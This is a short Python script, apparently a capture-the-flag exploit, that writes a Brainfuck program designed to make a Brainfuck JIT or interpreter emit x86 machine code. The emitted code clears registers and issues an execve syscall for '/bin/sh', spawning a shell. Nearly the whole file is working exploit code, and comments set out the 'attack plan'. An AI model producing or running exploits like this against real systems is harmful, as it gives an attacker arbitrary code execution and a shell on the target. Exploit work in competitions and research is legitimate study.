from pathlib import Path

def gen(n):
    if n < 0:
        return "-" * (-n)
    else:
        return "+" * (n)
def byte(x):
    assert x in range(1, 256)
    if x >= 128:
        return "<" * (256 - x)
    else:
        return ">" * x

# XXX 83  c3  XXX
# 0   1   2   3

# 00  YYY >c3 XXX
# >c3 ^2 + YYY^1 + 00

# 00  YYY <c3 XXX
# 00 

## Building blocks:
## add BYTE PTR [ebx], XXX: 80 03 XXX
## add ebx, XXX:            83 c3 XXX
def two_byte_op(op, add_to_data=0):
    assert len(op) == 2
    DIFFERENCE_83_WITH_NOP = 0x90 - 0x83
    if op[0] > 0xc3:
        return gen(add_to_data + 256 * (DIFFERENCE_83_WITH_NOP + 256 * (op[0] - 0xc3))) + byte(op[1])
    else:
        return gen(add_to_data + 256 * (DIFFERENCE_83_WITH_NOP + 256 * (256 + (op[0] - 0xc3)))) + byte(op[1])

number_of_loops = 0
CODE = ""

## Load 11 (Execve syscall number) into eax by printing it
CODE += "+" * 11
CODE += "."
CODE += "-" * 11

## Load "/bin/sh" string (into ebx, where it needs to be)
for c in "/bin/sh":
    c = ord(c)
    CODE += "+" * c
    CODE += ">"
CODE += "<" * len("/bin/sh")
CODE += "["; number_of_loops += 1

## Custom machine code
CODE += two_byte_op([0x31, 0xc9]) # xor ecx, ecx
CODE += "["; number_of_loops += 1
CODE += two_byte_op([0x31, 0xd2]) # xor edx, edx
CODE += "["; number_of_loops += 1
CODE += two_byte_op([0xcd, 0x80]) ## Syscall
CODE += "."

## Finish exploit
CODE += "]" * number_of_loops
Path("exploit.bf").write_text(CODE)
print(f"{len(CODE)=}")

## Attack plan
# ecx = 0
# edx = 0
# ebx = "/bin/sh"
# eax = 11  ->
# int 0x80
